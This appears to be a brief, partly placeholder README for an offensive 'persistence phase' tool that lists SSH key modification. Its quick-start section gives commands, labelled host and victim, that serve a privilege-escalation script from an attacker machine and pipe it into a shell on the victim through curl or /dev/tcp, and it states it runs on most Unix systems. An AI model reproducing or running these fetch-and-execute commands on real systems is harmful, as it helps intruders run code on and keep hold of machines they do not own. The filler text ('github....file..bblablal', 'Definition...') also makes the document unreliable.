# Persistence Phase

Definition...  

Available parts:
- Modify SSH Keys

## Quick Start


```bash
# From github
curl -L github....file..bblablal
```




```bash
# Local network
sudo python -m SimpleHTTPServer 80 #Host
curl 10.10.10.10/linpeas.sh | sh #Victim
# Without curl
sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
cat < /dev/tcp/10.10.10.10/80 | sh #Victim
```


## Results

Results stored to output/ directory.

## Compatibility

The script is fully POSIX compatible and can run on most unix-based (POSIX/Unix/Linux) systems. 